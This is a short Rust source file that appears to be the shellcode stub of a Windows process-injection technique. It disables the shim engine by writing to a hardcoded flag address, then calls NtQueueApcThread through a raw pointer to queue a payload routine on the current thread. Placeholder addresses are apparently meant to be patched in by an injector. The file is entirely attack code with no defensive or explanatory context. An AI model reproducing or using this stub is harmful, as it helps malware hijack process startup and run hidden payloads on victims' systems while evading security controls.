use winapi::ctypes::c_void;
use winapi::shared::ntdef::HANDLE;

// Define our own version of NtCurrentThread()
const NT_CURRENT_THREAD: HANDLE = -2isize as HANDLE;

// Update the type definition 
type NtQueueApcThread = unsafe extern "system" fn(
    ThreadHandle: HANDLE,
    ApcRoutine: *const c_void,
    ApcArgument1: *const c_void,
    ApcArgument2: *const c_void,
    ApcArgument3: *const c_void,
) -> i32;

fn main() {
    // Define our hardcoded addresses 
    let g_shims_enabled: *mut u8 = 0x9999999999999999 as *mut u8;
    let mm_payload: *const c_void = 0x8888888888888888 as *const c_void;
    let mm_context: *const c_void = 0x7777777777777777 as *const c_void;
    
    // Disable shim engine
    unsafe {
        *g_shims_enabled = 0;
    }

    // Queue APC using the function pointer 
    let nt_queue_apc_thread: NtQueueApcThread = unsafe {
        std::mem::transmute(0x6666666666666666u64)
    };

    unsafe {
        nt_queue_apc_thread(
            NT_CURRENT_THREAD,
            mm_payload,
            mm_context,
            std::ptr::null(),
            std::ptr::null(),
        );
    }
}
